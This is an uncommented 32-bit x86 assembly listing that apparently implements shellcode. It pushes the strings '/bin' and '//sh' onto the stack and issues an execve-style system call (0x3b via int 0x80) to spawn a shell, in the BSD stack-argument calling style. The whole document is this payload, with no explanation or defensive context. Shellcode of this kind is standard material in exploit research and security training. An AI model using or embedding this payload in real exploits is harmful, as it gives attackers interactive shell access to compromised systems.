.globl main
main:
    xorl  %eax, %eax
    pushl %eax
    movl  %esp, %eax
    subl  $0x10, %eax
    pushl %eax
    movl  %esp, %ebx
    xorl  %eax, %eax
    pushl %eax        
    pushl $0x68732f2f
    pushl $0x6e69622f
    movl  %esp, %edx
    xorl  %eax, %eax
    pushl %eax
    pushl %ebx
    pushl %edx
    pushl %eax
    movb  $0x3b, %al
    int   $0x80
